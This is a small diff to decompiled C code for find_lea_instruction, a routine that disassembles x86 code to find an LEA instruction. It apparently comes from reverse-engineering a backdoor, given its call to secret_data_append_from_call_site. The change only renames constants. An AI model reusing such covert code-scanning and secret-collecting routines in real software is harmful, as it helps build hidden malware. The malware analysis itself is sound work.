@@ -23,8 +23,8 @@ BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)
   u64 local_50;
   
   bVar4 = 0;
-  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,0);
-  if (BVar1 != 0) {
+  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,FALSE);
+  if (BVar1 != FALSE) {
     puVar3 = local_80;
     for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
       *puVar3 = 0;
@@ -32,12 +32,12 @@ BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)
     }
     for (; code_start < code_end; code_start = code_start + 1) {
       BVar1 = x86_dasm((dasm_ctx_t *)local_80,code_start,code_end);
-      if ((((BVar1 != 0) && (local_58 == 0x10d)) && ((local_80[4]._1_1_ & 7) == 1)) &&
+      if ((((BVar1 != FALSE) && (local_58 == 0x10d)) && ((local_80[4]._1_1_ & 7) == 1)) &&
          ((local_50 == displacement || (local_50 == -displacement)))) {
-        return 1;
+        return TRUE;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
